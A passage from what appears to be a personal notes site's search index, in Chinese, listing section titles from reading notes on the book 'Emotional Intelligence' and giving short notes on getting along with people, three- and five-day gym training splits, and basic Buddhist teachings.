ft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_116","text":"","title":"\u793e\u4ea4\u6709\u5229\u4e8e\u6446\u8131\u60b2\u4f24"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_117","text":"","title":"\u6292\u60c5\u969c\u788d"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#2_4","text":"","title":"\u6292\u60c5\u969c\u788d2"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#3","text":"","title":"\u6292\u60c5\u969c\u788d3"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_118","text":"","title":"\u968f\u673a\u5e94\u53d8\u800c\u53c8\u5fe0\u4e8e\u81ea\u6211\u5185\u5fc3\u7684\u611f\u53d7"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_119","text":"","title":"\u63d0\u9ad8\u60c5\u7eea\u6446\u8131\u7684\u9014\u5f84"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_120","text":"","title":"\u540c\u7406\u5fc3\u7684\u7f3a\u5931\u4f1a\u5e26\u5e26\u76f8\u4f20"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_121","text":"","title":"\u7ae5\u5e74\u6bd4\u8f83\u91cd\u8981"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_122","text":"","title":"\u56e2\u961f\u6700\u4f18\u5316\u662f\u4fdd\u6301\u56e2\u961f\u5185\u90e8\u548c\u8c10"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_123","text":"","title":"\u5371\u673a\u59cb\u4e8e\u60c5\u7eea\u6cdb\u6ee5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_124","text":"","title":"\u65e0\u52a9\u611f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_125","text":"","title":"\u5e0c\u671b\u80fd\u51cf\u5c11\u7126\u8651"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_126","text":"","title":"\u73b0\u5728\u5bfc\u81f4\u60c5\u7eea\u76f2\u7684\u539f\u56e0"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_127","text":"","title":"\u76f8\u6bd4\u4e4b\u4e0b\u4f7f\u81ea\u5df1\u4e0d\u90a3\u4e48\u6291\u90c1"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_128","text":"","title":"\u76f8\u4fe1\u4e8b\u60c5\u4f1a\u597d\u8d77\u6765\u7684"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_129","text":"","title":"\u4eab\u53d7\u5b66\u4e60\u7684\u7eaf\u7cb9\u4e50\u8da3\u7684\u4eba\u5bb9\u6613\u8fdb\u5165\u6d8c\u6d41"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#1_3","text":"","title":"\u6d88\u9664\u6124\u6012\u7684\u4e24\u79cd\u65b9\u6cd51"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#2_5","text":"","title":"\u6d88\u9664\u6124\u6012\u7684\u4e24\u79cd\u65b9\u6cd52"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#3_1","text":"","title":"\u6d88\u9664\u6124\u6012\u7684\u4e24\u79cd\u65b9\u6cd53"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_130","text":"","title":"\u6d88\u9664\u6124\u6012\u7684\u603b\u7ed3\u4e09\u79cd"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_131","text":"","title":"\u6d88\u6781\u9003\u8dd1\u7684\u53cd\u5e94\u5e26\u6765\u7684\u540e\u679c"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_132","text":"","title":"\u5c0f\u9738\u738b\u662f\u600e\u4e48\u5f62\u6210\u7684"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_133","text":"","title":"\u5fc3\u60c5\u597d\u4f1a\u4ea7\u751f\u6b63\u786e\u7684\u51b3\u7b56"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_134","text":"","title":"\u5ba3\u6cc4\u6012\u706b\u5bf9\u5e73\u606f\u6012\u706b\u6ca1\u6709\u4efb\u4f55\u597d\u5904"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_135","text":"","title":"\u538b\u6291\u8005"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_136","text":"","title":"\u4e25\u683c\u5bf9\u5e26\u5b69\u5b50"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_137","text":"","title":"\u4e25\u91cd\u6291\u90c1\u7684\u89e3\u9664\u65b9\u6cd5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#2_6","text":"","title":"\u6291\u90c1\u7684\u539f\u56e02"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_138","text":"","title":"\u6291\u90c1\u8005\u4f1a\u9009\u62e9\u66f4\u52a0\u6291\u90c1\u7684\u6d3b\u52a8"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_139","text":"","title":"\u6291\u90c1\u75c7\u539f\u56e0"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_140","text":"","title":"\u6291\u90c1\u4e2d\u6c89\u601d\u4f1a\u4f7f\u81ea\u5df1\u66f4\u52a0\u6291\u90c1"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_141","text":"","title":"\u5e94\u5f53\u5c3d\u65e9\u505c\u6b62\u6b67\u89c6\u884c\u4e3a"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_142","text":"","title":"\u6d8c\u6d41\u4fc3\u4f7f\u628a\u4eba\u4eec\u81ea\u8eab\u6f5c\u80fd\u53d1\u6325\u5230\u6781\u81f4"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_143","text":"","title":"\u6d8c\u6d41\u662f\u65b0\u7684\u6559\u80b2\u6a21\u5f0f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_144","text":"","title":"\u5fe7\u8651\u7684\u4e24\u79cd\u8868\u73b0\u5f62\u5f0f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_145","text":"","title":"\u5fe7\u8651\u8fc7\u591a\u4e0d\u662f\u597d\u4e8b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_146","text":"","title":"\u5fe7\u8651\u548c\u7126\u8651\u5bf9\u6240\u6709\u5fc3\u7406\u6d3b\u52a8\u90fd\u6709\u7834\u574f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_147","text":"","title":"\u7531\u4e8e\u60c5\u7eea\u4f1a\u4f20\u67d3\uff0c\u6240\u4ee5\u4e0d\u8981\u53d7\u5230\u4e0d\u597d\u7684\u60c5\u7eea\u5f71\u54cd"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_148","text":"","title":"\u6709\u6c27\u8fd0\u52a8\u4f1a\u964d\u4f4e\u6291\u90c1\u7684\u7a0b\u5ea6"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_149","text":"","title":"\u4e0e\u6bcd\u5a74\u6700\u50cf\u7684\u534f\u8c03\u662f\u505a\u7231"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_150","text":"","title":"\u4e0e\u751f\u4ff1\u6765\u7684\u6c14\u8d28"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_151","text":"","title":"\u77e5\u8bc6\u5de5\u4eba\u534f\u8c03\u5de5\u4f5c\u624d\u80fd\u6709\u751f\u4ea7\u529b\uff08\u5f7c\u5f97\u5fb7\u9c81\u514b\uff09"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_152","text":"","title":"\u91cd\u73b0\u521b\u4f24\u7684\u573a\u666f\u662f\u6cbb\u7597\u521b\u4f24\u7684\u65b9\u6cd5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_153","text":"","title":"\u91cd\u73b0\u521b\u4f24\u7684\u6e38\u620f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_154","text":"","title":"\u6ce8\u610f\u529b\u7684\u9ad8\u5ea6\u96c6\u4e2d\u53eb\u6d8c\u6d41"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_155","text":"","title":"\u81ea\u52a8\u60f3\u6cd5\u7684\u5371\u5bb3"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_156","text":"","title":"\u7ec4\u7ec7\u80fd\u529b\u548c\u534f\u5546\u89e3\u51b3\u80fd\u529b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_157","text":"","title":"\u8111\u524d\u989d"},{"location":"soft/%E4%B8%8E%E4%BA%BA%E7%9B%B8%E5%A4%84%E7%9A%84%E8%AF%80%E7%AA%8D/","text":"\u5207\u83ab\u6279\u8bc4\u3001\u62b1\u6028\u3001\u6307\u8d23 \u5207\u83ab\u865a\u4f2a\u7684\u606d\u7ef4\u548c\u5949\u627f\uff0c\u4f46\u6c42\u771f\u8bda\u7684\u8d5e\u7f8e\u548c\u611f\u8c22 \u6fc0\u53d1\u522b\u4eba\u7684\u6e34\u671b","title":"\u4e0e\u4eba\u76f8\u5904\u7684\u8bc0\u7a8d"},{"location":"soft/%E4%BB%80%E4%B9%88%E5%8F%AB%E4%B8%89%E5%88%86%E5%8C%96%E5%92%8C%E4%BA%94%E5%88%86%E5%8C%96/","text":"\u5728\u5065\u8eab\u4e2d\uff0c\u201c\u4e09\u5206\u5316\u201d\u548c\u201c\u4e94\u5206\u5316\u201d\u662f\u6307\u8bad\u7ec3\u8ba1\u5212\u4e2d\u6bcf\u5468\u5c06\u4e0d\u540c\u7684\u808c\u8089\u7fa4\u5206\u914d\u5230\u4e0d\u540c\u5929\u6570\u8fdb\u884c\u8bad\u7ec3\u7684\u65b9\u6cd5\u3002 \u4e09\u5206\u5316\u8bad\u7ec3\uff083-Day Split\uff09 \uff1a \u4e09\u5206\u5316\u8bad\u7ec3\u5c06\u5168\u8eab\u7684\u808c\u8089\u7fa4\u5206\u4e3a\u4e09\u90e8\u5206\uff0c\u6bcf\u4e2a\u8bad\u7ec3\u65e5\u9488\u5bf9\u5176\u4e2d\u4e00\u90e8\u5206\u8fdb\u884c\u8bad\u7ec3\u3002\u8fd9\u79cd\u65b9\u6cd5\u901a\u5e38\u662f\u4e00\u5468\u5185\u8bad\u7ec3\u4e09\u5929\uff0c\u5176\u4ed6\u5929\u4f11\u606f\u6216\u8fdb\u884c\u4f4e\u5f3a\u5ea6\u7684\u6709\u6c27\u8fd0\u52a8\u3002 \u4f8b\u5b50\uff1a \u7b2c\u4e00\u5929\uff1a\u80f8\u90e8\u3001\u80a9\u90e8\u3001\u4e09\u5934\u808c \u7b2c\u4e8c\u5929\uff1a\u80cc\u90e8\u3001\u4e8c\u5934\u808c \u7b2c\u4e09\u5929\uff1a\u817f\u90e8\u3001\u8179\u90e8 \u4e94\u5206\u5316\u8bad\u7ec3\uff085-Day Split\uff09 \uff1a \u4e94\u5206\u5316\u8bad\u7ec3\u5c06\u5168\u8eab\u7684\u808c\u8089\u7fa4\u5206\u4e3a\u4e94\u90e8\u5206\uff0c\u6bcf\u4e2a\u8bad\u7ec3\u65e5\u9488\u5bf9\u5176\u4e2d\u4e00\u90e8\u5206\u8fdb\u884c\u8bad\u7ec3\u3002\u8fd9\u79cd\u65b9\u6cd5\u901a\u5e38\u662f\u4e00\u5468\u5185\u8bad\u7ec3\u4e94\u5929\uff0c\u5176\u4ed6\u4e24\u5929\u4f11\u606f\u6216\u8fdb\u884c\u4f4e\u5f3a\u5ea6\u7684\u6709\u6c27\u8fd0\u52a8\u3002 \u4f8b\u5b50\uff1a \u7b2c\u4e00\u5929\uff1a\u80f8\u90e8 \u7b2c\u4e8c\u5929\uff1a\u80cc\u90e8 \u7b2c\u4e09\u5929\uff1a\u817f\u90e8 \u7b2c\u56db\u5929\uff1a\u80a9\u90e8 \u7b2c\u4e94\u5929\uff1a\u624b\u81c2\uff08\u5305\u62ec\u4e8c\u5934\u808c\u548c\u4e09\u5934\u808c\uff09 \u8fd9\u79cd\u5206\u5316\u8bad\u7ec3\u65b9\u6cd5\u53ef\u4ee5\u8ba9\u4f60\u66f4\u4e13\u6ce8\u4e8e\u6bcf\u4e2a\u808c\u8089\u7fa4\uff0c\u786e\u4fdd\u6bcf\u4e2a\u90e8\u4f4d\u90fd\u5f97\u5230\u5145\u5206\u7684\u953b\u70bc\u548c\u4f11\u606f\uff0c\u4ee5\u4fc3\u8fdb\u808c\u8089\u7684\u751f\u957f\u548c\u6062\u590d\u3002\u9009\u62e9\u4e09\u5206\u5316\u8fd8\u662f\u4e94\u5206\u5316\u53d6\u51b3\u4e8e\u4f60\u7684\u8bad\u7ec3\u76ee\u6807\u3001\u65f6\u95f4\u5b89\u6392\u548c\u4e2a\u4eba\u504f\u597d\u3002 \u4e09\u5206\u5316\u8bad\u7ec3\u7684\u4f18\u70b9\u548c\u9002\u7528\u4eba\u7fa4\uff1a \u4f18\u70b9\uff1a - \u6bcf\u5468\u53ea\u9700\u8bad\u7ec3\u4e09\u5929\uff0c\u9002\u5408\u65f6\u95f4\u8f83\u4e3a\u7d27\u5f20\u7684\u4eba\u7fa4\u3002 - \u6bcf\u6b21\u8bad\u7ec3\u65f6\u95f4\u8f83\u957f\uff0c\u53ef\u4ee5\u8fdb\u884c\u66f4\u9ad8\u5f3a\u5ea6\u7684\u8bad\u7ec3\u3002 - \u6709\u66f4\u591a\u7684\u4f11\u606f\u65f6\u95f4\uff0c\u6709\u52a9\u4e8e\u808c\u8089\u6062\u590d\u548c\u751f\u957f\u3002 \u9002\u7528\u4eba\u7fa4\uff1a - \u521d\u5b66\u8005\u6216\u4e2d\u7ea7\u5065\u8eab\u7231\u597d\u8005\u3002 - \u9700\u8981\u8f83\u957f\u65f6\u95f4\u6062\u590d\u7684\u4e2a\u4f53\u3002 - \u6709\u8f83\u591a\u5176\u4ed6\u6d3b\u52a8\u6216\u65f6\u95f4\u5b89\u6392\u7684\u4eba\u3002 \u4e94\u5206\u5316\u8bad\u7ec3\u7684\u4f18\u70b9\u548c\u9002\u7528\u4eba\u7fa4\uff1a \u4f18\u70b9\uff1a - \u6bcf\u6b21\u8bad\u7ec3\u96c6\u4e2d\u5728\u4e00\u4e2a\u6216\u4e24\u4e2a\u808c\u8089\u7fa4\uff0c\u53ef\u4ee5\u66f4\u6df1\u5165\u5730\u8bad\u7ec3\u6bcf\u4e2a\u90e8\u4f4d\u3002 - \u6bcf\u4e2a\u90e8\u4f4d\u7684\u8bad\u7ec3\u9891\u7387\u8f83\u4f4e\uff0c\u4f46\u6bcf\u6b21\u8bad\u7ec3\u7684\u5f3a\u5ea6\u8f83\u9ad8\u3002 - \u66f4\u9002\u5408\u6709\u7ecf\u9a8c\u7684\u8bad\u7ec3\u8005\uff0c\u53ef\u4ee5\u5728\u6bcf\u4e2a\u90e8\u4f4d\u4f7f\u7528\u66f4\u591a\u7684\u8bad\u7ec3\u53d8\u5f0f\u548c\u6280\u5de7\u3002 \u9002\u7528\u4eba\u7fa4\uff1a - \u4e2d\u9ad8\u7ea7\u5065\u8eab\u7231\u597d\u8005\u3002 - \u6062\u590d\u80fd\u529b\u8f83\u5f3a\u7684\u4eba\u7fa4\u3002 - \u6709\u66f4\u591a\u65f6\u95f4\u6295\u5165\u5230\u5065\u8eab\u7684\u4eba\u3002 \u5177\u4f53\u5efa\u8bae\uff1a \u521d\u5b66\u8005 \uff1a\u901a\u5e38\u5efa\u8bae\u4ece\u4e09\u5206\u5316\u8bad\u7ec3\u5f00\u59cb\uff0c\u4ee5\u786e\u4fdd\u6bcf\u4e2a\u808c\u8089\u7fa4\u6709\u8db3\u591f\u7684\u65f6\u95f4\u6062\u590d\uff0c\u540c\u65f6\u4e0d\u81f3\u4e8e\u8fc7\u5ea6\u8bad\u7ec3\u3002 \u4e2d\u7ea7\u8bad\u7ec3\u8005 \uff1a\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u6062\u590d\u80fd\u529b\u548c\u76ee\u6807\u9009\u62e9\u4e09\u5206\u5316\u6216\u4e94\u5206\u5316\u3002\u5982\u679c\u611f\u89c9\u4e09\u5206\u5316\u7684\u5f3a\u5ea6\u4e0d\u8db3\uff0c\u53ef\u4ee5\u9010\u6e10\u8fc7\u6e21\u5230\u4e94\u5206\u5316\u3002 \u9ad8\u7ea7\u8bad\u7ec3\u8005 \uff1a\u901a\u5e38\u4e94\u5206\u5316\u8bad\u7ec3\u66f4\u9002\u5408\u9ad8\u7ea7\u8bad\u7ec3\u8005\uff0c\u56e0\u4e3a\u4ed6\u4eec\u9700\u8981\u66f4\u9ad8\u7684\u8bad\u7ec3\u9891\u7387\u548c\u5f3a\u5ea6\u6765\u7ee7\u7eed\u523a\u6fc0\u808c\u8089\u751f\u957f\u3002 \u6700\u7ec8\uff0c\u6700\u4f73\u7684\u8bad\u7ec3\u8ba1\u5212\u5e94\u8be5\u662f\u9002\u5408\u4f60\u7684\u4e2a\u4eba\u60c5\u51b5\u548c\u76ee\u6807\u7684\u3002\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u4e24\u79cd\u65b9\u6cd5\uff0c\u770b\u770b\u54ea\u79cd\u65b9\u6cd5\u5bf9\u4f60\u6765\u8bf4\u6548\u679c\u66f4\u597d\uff0c\u5e76\u6839\u636e\u9700\u8981\u8fdb\u884c\u8c03\u6574\u3002","title":"\u4ec0\u4e48\u53eb\u4e09\u5206\u5316\u548c\u4e94\u5206\u5316"},{"location":"soft/%E4%BD%9B%E6%B3%95/","text":"\u4f17\u751f\u7686\u82e6 \u201c\u4f17\u751f\u7686\u82e6\u201d\u662f\u4f5b\u6559\u4e2d\u7684\u4e00\u4e2a\u91cd\u8981\u6559\u4e49\uff0c\u6307\u7684\u662f\u6240\u6709\u6709\u60c5\u4f17\u751f\uff08\u5373\u6240\u6709\u5177\u6709\u610f\u8bc6\u7684\u751f\u547d\u4f53\uff09\u90fd\u5728\u7ecf\u5386\u82e6\u96be\u3002\u8fd9\u4e2a\u6559\u4e49\u6e90\u4e8e\u4f5b\u9640\u7684\u201c\u56db\u8c1b\u201d\u6559\u4e49\uff0c\u7279\u522b\u662f\u201c\u82e6\u8c1b\u201d\uff0c\u5176\u4e2d\u660e\u786e\u6307\u51fa\u4e86\u751f\u547d\u4e2d\u5b58\u5728\u7684\u5404\u79cd\u82e6\u96be\u3002\u4ee5\u4e0b\u662f\u5bf9\u201c\u4f17\u751f\u7686\u82e6\u201d\u7684\u8be6\u7ec6\u89e3\u91ca\uff1a \u751f\u82e6 \uff1a\u51fa\u751f\u7684\u75db\u82e6\uff0c\u5305\u62ec\u4ece\u6bcd\u80ce\u4e2d\u5206\u5a29\u7684\u75db\u82e6\u3002 \u8001\u82e6 \uff1a\u8870\u8001\u7684\u75db\u82e6\uff0c\u8eab\u4f53\u548c\u7cbe\u795e\u7684\u8870\u9000\u3002 \u75c5\u82e6 \uff1a\u75be\u75c5\u5e26\u6765\u7684\u75db\u82e6\uff0c\u65e0\u8bba\u662f\u8eab\u4f53\u4e0a\u7684\u8fd8\u662f\u5fc3\u7406\u4e0a\u7684\u3002 \u6b7b\u82e6 \uff1a\u6b7b\u4ea1\u7684\u75db\u82e6\u548c\u4e34\u7ec8\u7684\u6050\u60e7\u3002 \u7231\u522b\u79bb\u82e6 \uff1a\u4e0e\u81ea\u5df1\u7231\u7684\u4eba\u6216\u4e8b\u7269\u5206\u79bb\u7684\u75db\u82e6\u3002 \u6028\u618e\u4f1a\u82e6 \uff1a\u4e0e\u81ea\u5df1\u618e\u6068\u7684\u4eba\u6216\u4e8b\u7269\u76f8\u9047\u7684\u75db\u82e6\u3002 \u6c42\u4e0d\u5f97\u82e6 \uff1a\u6e34\u671b\u7684\u4e8b\u7269\u6216\u76ee\u6807\u65e0\u6cd5\u8fbe\u6210\u7684\u75db\u82e6\u3002 \u4e94\u8574\u70bd\u76db\u82e6 \uff1a\u7531\u8272\u3001\u53d7\u3001\u60f3\u3001\u884c\u3001\u8bc6\u4e94\u8574\uff08\u6784\u6210\u4e2a\u4eba\u7ecf\u9a8c\u7684\u4e94\u4e2a\u8981\u7d20\uff09\u5e26\u6765\u7684\u79cd\u79cd\u70e6\u607c\u548c\u75db\u82e6\u3002 \u4f5b\u6559\u8ba4\u4e3a\uff0c\u8fd9\u4e9b\u82e6\u96be\u662f\u7531\u4e8e\u4eba\u4eec\u7684\u65e0\u660e\uff08\u5373\u5bf9\u771f\u7406\u7684\u65e0\u77e5\uff09\u3001\u8d2a\u6b32\u548c\u6267\u7740\u6240\u5bfc\u81f4\u7684\u3002\u901a\u8fc7\u4fee\u884c\u3001\u89c9\u609f\uff0c\u7279\u522b\u662f\u901a\u8fc7\u201c\u516b\u6b63\u9053\u201d\u7684\u5b9e\u8df5\uff0c\u4eba\u4eec\u53ef\u4ee5\u9010\u6e10\u6446\u8131\u8fd9\u4e9b\u82e6\u96be\uff0c\u8fbe\u5230\u6d85\u69c3\u7684\u89e3\u8131\u72b6\u6001\u3002 \u516b\u6b63\u9053 \u516b\u6b63\u9053\u662f\u4f5b\u6559\u4e2d\u7684\u4fee\u884c\u65b9\u6cd5\u548c\u751f\u6d3b\u6307\u5357\uff0c\u65e8\u5728\u5e2e\u52a9\u4fee\u884c\u8005\u8fbe\u5230\u89e3\u8131\u548c\u6d85\u69c3\u7684\u5883\u754c\u3002\u4ee5\u4e0b\u662f\u516b\u6b63\u9053\u7684\u7b80\u8981\u89e3\u91ca\uff1a \u6b63\u89c1 \uff1a\u6b63\u786e\u7684\u89c1\u89e3\u548c\u7406\u89e3\uff0c\u7279\u522b\u662f\u5bf9\u56db\u8c1b\uff08\u82e6\u3001\u96c6\u3001\u706d\u3001\u9053\uff09\u7684\u7406\u89e3\u3002 \u6b63\u601d\u7ef4 \uff1a\u6b63\u786e\u7684\u601d\u60f3\u548c\u610f\u56fe\uff0c\u5305\u62ec\u79bb\u6b32\u3001\u5584\u826f\u548c\u65e0\u5bb3\u7684\u601d\u60f3\u3002 \u6b63\u8bed \uff1a\u6b63\u786e\u7684\u8a00\u8bed\uff0c\u4e0d\u5984\u8bed\u3001\u4e0d\u6076\u53e3\u3001\u4e0d\u4e24\u820c\u3001\u4e0d\u7eee\u8bed\uff0c\u4fdd\u6301\u8bda\u5b9e\u548c\u5584\u610f\u3002 \u6b63\u4e1a \uff1a\u6b63\u786e\u7684\u884c\u4e3a\uff0c\u4e0d\u6740\u751f\u3001\u4e0d\u5077\u76d7\u3001\u4e0d\u90aa\u6deb\uff0c\u884c\u4e3a\u7b26\u5408\u9053\u5fb7\u89c4\u8303\u3002 \u6b63\u547d \uff1a\u6b63\u5f53\u7684\u8c0b\u751f\u624b\u6bb5\uff0c\u9009\u62e9\u4e0d\u4f24\u5bb3\u4ed6\u4eba\u7684\u804c\u4e1a\uff0c\u4fdd\u6301\u751f\u6d3b\u7684\u6b63\u5f53\u6027\u3002 \u6b63\u7cbe\u8fdb \uff1a\u6b63\u786e\u7684\u52aa\u529b\uff0c\u52e4\u594b\u4fee\u884c\uff0c\u907f\u514d\u4e0d\u5584\u7684\u72b6\u6001\uff0c\u589e\u957f\u5584\u6cd5\u3002 \u6b63\u5ff5 \uff1a\u6b63\u786e\u7684\u89c9\u77e5\u548c\u4e13\u6ce8\uff0c\u7279\u522b\u662f\u5bf9\u8eab\u3001\u53d7\u3001\u5fc3\u3001\u6cd5\u7684\u56db\u5ff5\u5904\u7684\u89c2\u7167\u3002 \u6b63\u5b9a \uff1a\u6b63\u786e\u7684\u7985\u5b9a\uff0c\u901a\u8fc7\u6df1\u5ea6\u7684\u51a5\u60f3\u548c\u96c6\u4e2d\uff0c\u57f9\u517b\u5185\u5fc3\u7684\u5e73\u9759\u548c\u89c9\u609f\u3002 \u516b\u6b63\u9053\u7efc\u5408\u4e86\u667a\u6167\u3001\u9053\u5fb7\u548c\u7985\u4fee\u4e09\u4e2a\u65b9\u9762\uff0c\u662f\u4e00\u6761\u5168\u9762\u7684\u4fee\u884c\u4e4b\u8def\uff0c\u5e2e\u52a9\u4fee\u884c\u8005\u51cf\u5c11\u75db\u82e6\uff0c\u6700\u7ec8\u8fbe\u5230\u89e3\u8131\u3002 \u56db\u5ff5\u5904 \u56db\u5ff5\u5904\u662f\u4f5b\u6559\u4e2d\u7684\u4e00\u79cd\u4fee\u884c\u65b9\u6cd5\uff0c\u65e8\u5728\u901a\u8fc7\u6df1\u5165\u89c2\u5bdf\u548c\u89c9\u77e5\u6765\u57f9\u517b\u667a\u6167\u548c\u89c9\u609f\u3002\u4ee5\u4e0b\u662f\u56db\u5ff5\u5904\u7684\u7b80\u8981\u89e3\u91ca\uff1a \u89c2\u8eab\u4e0d\u51c0 \uff1a\u89c2\u5bdf\u548c\u601d\u7ef4\u8eab\u4f53\u7684\u5404\u79cd\u4e0d\u51c0\u4e4b\u5904\uff0c\u8ba4\u8bc6\u5230\u8eab\u4f53\u5e76\u975e\u6052\u5e38\u7f8e\u4e3d\uff0c\u8fdb\u800c\u51cf\u5c11\u5bf9\u8eab\u4f53\u7684\u6267\u7740\u3002\u5177\u4f53\u65b9\u6cd5\u5305\u62ec\u89c2\u5bdf\u547c\u5438\u3001\u8eab\u4f53\u59ff\u52bf\u3001\u8eab\u4f53\u7684\u4e0d\u51c0\u90e8\u5206\u7b49\u3002 \u89c2\u53d7\u662f\u82e6 \uff1a\u89c2\u5bdf\u548c\u8ba4\u8bc6\u5404\u79cd\u611f\u53d7\uff08\u5305\u62ec\u75db\u82e6\u3001\u5feb\u4e50\u548c\u4e2d\u6027\u7684\u611f\u53d7\uff09\u672c\u8d28\u4e0a\u90fd\u662f\u82e6\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u90fd\u662f\u65e0\u5e38\u548c\u53d8\u5316\u7684\u3002\u901a\u8fc7\u8fd9\u79cd\u89c2\u5bdf\uff0c\u51cf\u5c11\u5bf9\u611f\u53d7\u7684\u6267\u7740\u3002 \u89c2\u5fc3\u65e0\u5e38 \uff1a\u89c2\u5bdf\u548c\u8ba4\u8bc6\u5230\u5fc3\u7684\u5404\u79cd\u72b6\u6001\uff08\u5982\u8d2a\u3001\u55d4\u3001\u75f4\u3001\u5584\u5ff5\u3001\u6076\u5ff5\u7b49\uff09\u90fd\u662f\u65e0\u5e38\u548c\u53d8\u5316\u7684\u3002\u901a\u8fc7\u8fd9\u79cd\u89c2\u5bdf\uff0c\u57f9\u517b\u5bf9\u5fc3\u7684\u6e05\u6670\u89c9\u77e5\u548c\u4e0d\u6267\u7740\u3002 \u89c2\u6cd5\u65e0\u6211 